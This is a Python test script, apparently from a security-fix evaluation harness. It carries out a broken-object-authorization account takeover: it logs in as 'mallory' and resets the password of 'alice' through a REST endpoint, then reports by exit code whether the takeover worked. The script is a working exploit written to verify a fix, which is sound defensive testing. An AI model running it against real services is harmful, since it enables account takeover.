"""Adversarial variant of the password-takeover BOLA.

Same attack class as exploit_pw.py, but varied: different attacker/victim
usernames (mallory/alice) and a different attacker-set password shape. A correct
token-scoped fix (update only the caller's own row) blocks this too.

Exit 0 => takeover SUCCEEDED (still vulnerable). Exit !=0 => BLOCKED.
Prints a machine-readable final line:  RESULT {json}
"""
import argparse, json, secrets, sys, requests

def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True)
    args = ap.parse_args()
    base = args.base_url.rstrip("/")
    sfx = secrets.token_hex(3)
    victim, attacker, pw = f"alice_{sfx}", f"mallory_{sfx}", "pw12345678"
    s = requests.Session()
    for u in (victim, attacker):
        s.post(f"{base}/users/v1/register",
               json={"username": u, "password": pw, "email": f"{u}@x.com"}, timeout=10)
    ta = s.post(f"{base}/users/v1/login",
                json={"username": attacker, "password": pw}, timeout=10).json().get("auth_token")
    new_pw = "PwnedBy_" + sfx + "!"
    pr = s.put(f"{base}/users/v1/{victim}/password", json={"password": new_pw},
               headers={"Authorization": f"Bearer {ta}", "X-Client": "mobile"}, timeout=10)
    r = s.post(f"{base}/users/v1/login",
               json={"username": victim, "password": new_pw}, timeout=10).json()
    took_over = bool(r.get("auth_token"))
    result = {"defect": "pw-takeover", "kind": "adversarial", "leaked": took_over,
              "status": pr.status_code}
    if took_over:
        print(f"EXPLOIT-SUCCEEDED (adversarial): took over {victim}")
    else:
        print("BLOCKED (adversarial): victim password unchanged")
    print("RESULT " + json.dumps(result))
    return 0 if took_over else 1

if __name__ == "__main__":
    sys.exit(main())
